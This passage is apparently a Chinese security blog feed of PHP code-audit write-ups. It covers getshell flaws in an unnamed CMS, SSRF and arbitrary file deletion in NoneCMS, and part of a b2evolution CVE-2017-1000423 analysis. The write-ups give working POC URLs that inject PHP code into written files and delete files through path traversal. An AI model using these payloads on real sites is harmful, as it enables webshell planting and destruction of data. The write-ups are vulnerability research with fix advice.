$lang_physicaldelok;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      $adminfile=$url_array[count($url_array)<span class="number">-2</span>];</span><br><span class="line">      $strsvalto=readmin($val[<span class="number">1</span>],$adminfile,<span class="number">1</span>);</span><br><span class="line">      filetest(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      deldir(<span class="string">'../../../'</span>.$val[<span class="number">1</span>]);</span><br><span class="line">      $dlappfile=parse_ini_file(<span class="string">'dlappfile.php'</span>,<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">if</span>($dlappfile[$strsvalto][<span class="string">'dlfile'</span>])&#123;</span><br><span class="line">         $return=varcodeb(<span class="string">'app'</span>);</span><br><span class="line">         $checksum=$return[<span class="string">'md5'</span>];</span><br><span class="line">         $met_file=<span class="string">'/dl/app_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile($dlappfile[$strsvalto][<span class="string">'dlfile'</span>],<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $met_file=<span class="string">'/dl/olupdate_curl.php'</span>;</span><br><span class="line">         $stringfile=dlfile(<span class="string">"v$metcms_v/$strsvalto"</span>,<span class="string">"../../../$val[1]"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>($stringfile==<span class="number">1</span>)&#123;</span><br><span class="line">         <span class="keyword">echo</span> $lang_physicalupdatesuc;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> dlerror($stringfile);</span><br><span class="line">         <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      $fileaddr=explode(<span class="string">'/'</span>,$val[<span class="number">1</span>]);</span><br><span class="line">      $filedir=<span class="string">"../../../"</span>.$fileaddr[<span class="number">0</span>];  </span><br><span class="line">      <span class="keyword">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class="number">0777</span>); &#125; </span><br><span class="line">      <span class="keyword">if</span>($fileaddr[<span class="number">1</span>]==<span class="string">"index.php"</span>)&#123;</span><br><span class="line">         Copyindx(<span class="string">"../../../"</span>.$val[<span class="number">1</span>],$val[<span class="number">2</span>]);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>当$action等于op而且$op等于3的时候，如果$filedir不存在则创建$filedir目录，而且如果$fileaddr[1]等于”index.php”则调用Copyindex函数，并传入$val[1]和$val[2]参数，此处两个参数来自变量$valphy,均可控！！跟进Copyindex函数源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin/include/global.func.php:877-884</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">      $oldcont =<span class="string">"&lt;?php\n# 某CMS  Enterprise Content Management System \n# Copyright (C) 某CMS  Co.,Ltd (http://www.某CMS.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) 某CMS  Co., Ltd. (http://www.某CMS.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">      $fp = fopen($newindx,w);</span><br><span class="line">      fputs($fp, $oldcont);</span><br><span class="line">      fclose($fp);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可见，直接把参数$type直接赋值给$fmodule,并写入文件内容，所以可以构造payload直接getshell.</p><h3 id="3-POC-xxx为任意的shell目录，index-php文件名不能修改"><a href="#3-POC-xxx为任意的shell目录，index-php文件名不能修改" class="headerlink" title="3. POC(xxx为任意的shell目录，index.php文件名不能修改)"></a>3. POC(xxx为任意的shell目录，index.php文件名不能修改)</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>admin<span class="regexp">/app/</span>physical<span class="regexp">/physical.php?action=op&amp;op=3&amp;valphy=123|xxx/i</span>ndex.php|<span class="number">123</span>;phpinfo();?&gt;<span class="regexp">/*</span></span><br></pre></td></tr></table></figure><p>生成的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/某CMS 5.3.18/</span>xxx<span class="regexp">/index.php</span></span><br></pre></td></tr></table></figure></p><h2 id="0x05-olupdate文件缺陷导致Getshell"><a href="#0x05-olupdate文件缺陷导致Getshell" class="headerlink" title="0x05 olupdate文件缺陷导致Getshell"></a>0x05 olupdate文件缺陷导致Getshell</h2><h3 id="1-漏洞点-1"><a href="#1-漏洞点-1" class="headerlink" title="1. 漏洞点"></a>1. 漏洞点</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/admin/system/olupdate.phpwen文件中，当$action=sql,$sql!=No Date且$sqlfile不是数组时进入如下过程</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#326-360行</span></span><br><span class="line"><span class="variable">$num</span>=1;</span><br><span class="line"><span class="variable">$random</span> = met_rand(6);</span><br><span class="line"><span class="variable">$date</span>=date(<span class="string">'Ymd'</span>,time());</span><br><span class="line">require_once <span class="string">'../system/database/global.func.php'</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    <span class="variable">$sqldump</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$startrow</span> = <span class="string">''</span>;</span><br><span class="line">    <span class="variable">$tables</span>=tableprearray(<span class="variable">$tablepre</span>);</span><br><span class="line">    <span class="variable">$sizelimit</span>=2048;</span><br><span class="line">    <span class="variable">$tableid</span> = isset(<span class="variable">$tableid</span>) ? <span class="variable">$tableid</span> - 1 : 0;</span><br><span class="line">    <span class="variable">$startfrom</span> = isset(<span class="variable">$startfrom</span>) ? intval(<span class="variable">$startfrom</span>) : 0;</span><br><span class="line">    <span class="variable">$tablenumber</span> = count(<span class="variable">$tables</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="variable">$tableid</span>; <span class="variable">$i</span> &lt; <span class="variable">$tablenumber</span> &amp;&amp; strlen(<span class="variable">$sqldump</span>) &lt; <span class="variable">$sizelimit</span> * 1000; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$sqldump</span> .= sql_dumptable(<span class="variable">$tables</span>[<span class="variable">$i</span>], <span class="variable">$startfrom</span>, strlen(<span class="variable">$sqldump</span>));</span><br><span class="line">        <span class="variable">$startfrom</span> = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$startfrom</span> = <span class="variable">$startrow</span>;</span><br><span class="line">    <span class="variable">$tableid</span> = <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">if</span>(trim(<span class="variable">$sqldump</span>))&#123;</span><br><span class="line">        <span class="variable">$sqlfile</span>[]=<span class="variable">$bakfile</span> = <span class="string">"../update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql"</span>;</span><br><span class="line">        <span class="variable">$version</span>=<span class="string">'version:'</span>.<span class="variable">$metcms_v</span>;</span><br><span class="line">        <span class="variable">$sqldump</span> = <span class="string">"#某CMS .cn Created &#123;<span class="variable">$version</span>&#125; \n#&#123;<span class="variable">$met_weburl</span>&#125;\n#&#123;<span class="variable">$tablepre</span>&#125;\n#&#123;<span class="variable">$met_webkeys</span>&#125;\n# --------------------------------------------------------\n\n\n"</span>.<span class="variable">$sqldump</span>;</span><br><span class="line">        <span class="keyword">if</span>(!file_put_contents(<span class="variable">$bakfile</span>, <span class="variable">$sqldump</span>))&#123;</span><br><span class="line">            dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/&#123;<span class="variable">$con_db_name</span>&#125;_&#123;<span class="variable">$date</span>&#125;_&#123;<span class="variable">$random</span>&#125;_&#123;<span class="variable">$num</span>&#125;.sql)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$num</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(trim(<span class="variable">$sqldump</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$sqlfile</span>)) <span class="variable">$string</span> = <span class="string">"&lt;?php\n \$sqlfile = "</span>.var_export(<span class="variable">$sqlfile</span>, <span class="literal">true</span>).<span class="string">"; ?&gt;"</span>;</span><br><span class="line">filetest(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_put_contents(<span class="string">"../update/<span class="variable">$addr</span>/sqlist.php"</span>,<span class="variable">$string</span>))&#123;</span><br><span class="line">    dl_error(<span class="variable">$lang_updaterr2</span>.<span class="string">"(&#123;<span class="variable">$adminfile</span>&#125;/update/<span class="variable">$addr</span>/sqlist.php)"</span>,<span class="variable">$type</span>,<span class="variable">$olid</span>,<span class="variable">$ver</span>,<span class="variable">$addr</span>,<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p><p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_db_name}<em>{$date}</em>{$random}_{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p><p>最后的payload结构如下：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/admin/</span>system/olupdate.php?action=sql<span class="variable">&amp;sqlfile</span>=<span class="number">1</span><span class="variable">&amp;string</span>=shell内容<span class="variable">&amp;addr</span>=shell的目录<span class="variable">&amp;tableid</span>=<span class="number">1000</span></span><br></pre></td></tr></table></figure></p><h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>&amp;addr=12313&amp;tableid=1000</span></span><br></pre></td></tr></table></figure><p>执行后的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/u</span>pdate<span class="regexp">/12313/</span>sqlist.php</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>NoneCMS1.3版本SSRF漏洞</title>
      <link href="/2018/01/23/Nonecms_ssrf/"/>
      <url>/2018/01/23/Nonecms_ssrf/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>NoneCMS添加文章处过滤不严存在SSRF漏洞<br><a id="more"></a></p><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#application/admin/controller/Article.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copy</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (request()-&gt;isAjax()) &#123;</span><br><span class="line">            $url = input(<span class="string">'post.url'</span>);</span><br><span class="line">            $cid = input(<span class="string">'post.cid'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$url || !substr_count($url, <span class="string">'csdn'</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请输入csdn博客文章地址'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>]));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!$cid) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请先选择分类'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>]));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                \phpQuery::newDocumentFile($url);</span><br><span class="line">                $title = pq(<span class="string">'.link_title a'</span>)-&gt;text();</span><br><span class="line">                <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">                    $title = pq(<span class="string">'.list_c_t a'</span>)-&gt;text();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!$title) &#123;</span><br><span class="line">                    $title = pq(<span class="string">'h1.csdn_top'</span>)-&gt;text();</span><br><span class="line">                &#125;</span><br><span class="line">                $content = pq(<span class="string">'#article_content'</span>)-&gt;text();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//如果抓取不到主内容</span></span><br><span class="line">                <span class="keyword">if</span> (!$content) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"文章不存在或禁止爬虫"</span>);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                $params[<span class="string">'cid'</span>] = $cid;</span><br><span class="line">                $params[<span class="string">'content'</span>] = $content;</span><br><span class="line">                $params[<span class="string">'title'</span>] = $title;</span><br><span class="line">                $params[<span class="string">'publishtime'</span>] = <span class="string">''</span>;</span><br><span class="line">                $params[<span class="string">'description'</span>] = trim(strip_tags($content));</span><br><span class="line">                $params[<span class="string">'copyfrom'</span>] = $url;</span><br><span class="line">                $article = <span class="keyword">new</span> articleModel();</span><br><span class="line">                <span class="keyword">if</span> ($article-&gt;data($params,<span class="keyword">true</span>)-&gt;save()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'msg'</span> =&gt; <span class="string">'转载成功'</span>, <span class="string">'url'</span> =&gt; url(<span class="string">'article/index'</span>, [<span class="string">'id'</span> =&gt; $cid])];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'转载失败'</span>, <span class="string">'url'</span> =&gt; <span class="string">''</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'添加失败：'</span> . $e-&gt;getMessage(), <span class="string">'url'</span> =&gt; <span class="string">''</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>1.当请求copy方法时首先判断请求方式为Ajax，然后检测要求存在url参数,并且url中包含csdn字符串即可（很容易利用<code>?csdn</code>绕过）。<br>2.调用<code>\phpQuery::newDocumentFile</code>，函数内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">newDocumentFile</span><span class="params">($file, $contentType = null)</span> </span>&#123;</span><br><span class="line">$documentID = <span class="keyword">self</span>::createDocumentWrapper(</span><br><span class="line">file_get_contents($file), $contentType</span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> phpQueryObject($documentID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>请求目标url,内部调用了file_get_contents请求。<br>3.由此可见，存在ssrf漏洞。</p><h2 id="0x02POC"><a href="#0x02POC" class="headerlink" title="0x02POC:"></a>0x02POC:</h2><p><img src="http://blackwolfsec.cc/static/picture/nonecms_ssrf_1.png" alt="payload"></p><p>目标服务器成功收到请求</p><p><img src="http://blackwolfsec.cc/static/picture/nonecms_ssrf_2.png" alt="ssrf"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>需要管理员登录后才能利用，且由于请求目标不是CSDN，会导致copy函数后面的处理获取不到有效数据，会提示“服务器出错”，但是实际请求已经成功发送出去了。</p><h2 id="0x04修复建议"><a href="#0x04修复建议" class="headerlink" title="0x04修复建议"></a>0x04修复建议</h2><p>利用parse_url提取URL的域名是否属于CSDN。</p>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>NoneCMS后台任意文件删除</title>
      <link href="/2018/01/22/Nonecms/"/>
      <url>/2018/01/22/Nonecms/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这两天学习Thinkphp5.1的开发手册，顺便审计一下<a href="http://www.5none.com/" target="_blank" rel="noopener">NoneCMS</a>，利用框架的安全性避免了不少的问题，但还是发现一枚任意文件删除漏洞。<br><a id="more"></a></p><h2 id="0x01漏洞分析"><a href="#0x01漏洞分析" class="headerlink" title="0x01漏洞分析"></a>0x01漏洞分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#application/admin/controller/Main.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!input(<span class="string">'?param.act'</span>)) &#123;</span><br><span class="line">            $file = request()-&gt;file(<span class="string">'pic_url'</span>);</span><br><span class="line"></span><br><span class="line">            $info = $file</span><br><span class="line">                -&gt;validate([<span class="string">'size'</span>=&gt; <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>,<span class="string">'ext'</span>=&gt;[<span class="string">'jpg'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>, <span class="string">'bmp'</span>]])</span><br><span class="line">                -&gt;move(Env::get(<span class="string">'root_path'</span>) . <span class="string">'public/uploads'</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($info) &#123;</span><br><span class="line">                <span class="comment">// 成功上传后 获取上传信息</span></span><br><span class="line">                $save_name = $info-&gt;getSaveName();</span><br><span class="line">                $realpath =  __ROOT__.<span class="string">'/uploads/'</span> . $save_name;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'path'</span> =&gt; $realpath, <span class="string">'save_name'</span> =&gt; $save_name]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 上传失败获取错误信息</span></span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'error'</span> =&gt; $file-&gt;getError()]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//删除图片</span></span><br><span class="line">            $img_dir = input(<span class="string">'param.path'</span>);</span><br><span class="line">            $real_path = str_replace(Env::get(<span class="string">'root_path'</span>),<span class="string">''</span>,$img_dir);</span><br><span class="line">            $path = str_replace([<span class="string">'/..\/'</span>,<span class="string">'/../'</span>],<span class="string">'/'</span>,Env::get(<span class="string">'root_path'</span>).$real_path);</span><br><span class="line">            <span class="keyword">echo</span>  $path ;</span><br><span class="line">            <span class="keyword">if</span> (@unlink($path)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'msg'</span> =&gt; <span class="string">'删除成功'</span>]));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">exit</span>(json_encode([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'删除失败'</span>]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>1.当请求upload方法时，如果if (!input(‘?param.act’))不成立，即存在act参数的情况下，进入else分支。<br>2.此时将path参数的值经过str_replace替换后传入unlink函数，直接删除，由于过滤不严导致任意文件删除。<br>3.可以采用绝对路径的方式或者windows下用<code>..\</code>绕过str_replace的限制。</p><h2 id="0x02任意文件删除POC"><a href="#0x02任意文件删除POC" class="headerlink" title="0x02任意文件删除POC:"></a>0x02任意文件删除POC:</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//127.0.0.1/NoneCMS/public/admin/main/upload/act/1</span>?path=public/install/install.lock</span><br><span class="line"></span><br><span class="line">http:<span class="string">//127.0.0.1/NoneCMS/public/admin/main/upload/act/1</span>?path=<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\<span class="string">..</span>\test.txt</span><br></pre></td></tr></table></figure><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>这个漏洞需要至少能够登录后台的管理员登录才能利用。</p><h2 id="0x04修复建议"><a href="#0x04修复建议" class="headerlink" title="0x04修复建议"></a>0x04修复建议</h2><ul><li>此处功能为删除图片，可以严格检查删除文件名的后缀是否为图片</li><li>同时过滤<code>..\</code>和<code>../</code></li></ul>]]></content>
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>B2evolution安装过程过滤不严导致Getshell漏洞分析（CVE-2017-1000423）</title>
      <link href="/2018/01/17/b2evolution_getshell/"/>
      <url>/2018/01/17/b2evolution_getshell/</url>
      <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>好久没有更新博客了，看到b2evolution6.6.0 - 6.8.10被爆出安装过程过滤不严导致Getshell漏洞（CVE-2017-1000423），简单分析一下。<br><a id="more"></a></p><h2 id="0x01复现环境搭建"><a href="#0x01复现环境搭建" class="headerlink" title="0x01复现环境搭建"></a>0x01复现环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/b2evolution/b2evolution.git</span><br><span class="line"><span class="built_in">cd</span> b2evolution</span><br><span class="line">git checkout -b 6.8.10</span><br></pre></td></tr></table></figure><h2 id="0x02分析过程"><a href="#0x02分析过程" class="headerlink" title="0x02分析过程"></a>0x02分析过程</h2><p>1.请求<a href="http://localhost/b2evolution/install/index.php?action=start" target="_blank" rel="noopener">http://localhost/b2evolution/install/index.php?action=start</a></p><p>2.输入Base URL的值如下（需要有效的数据库配置）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span>\\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure><p>3.处理过程跟进install/_functions_install.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第1899行</span></span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">"\$db_config = array(\n"</span></span><br><span class="line">.<span class="string">"\t'user'     =&gt; '"</span>.str_replace( <span class="keyword">array</span>( <span class="string">"'"</span>, <span class="string">"\$"</span> ), <span class="keyword">array</span>( <span class="string">"\'"</span>, <span class="string">"\\$"</span> ), $params[<span class="string">'db_user'</span>] ).<span class="string">"',\$1"</span></span><br><span class="line">.<span class="string">"\t'password' =&gt; '"</span>.str_replace( <span 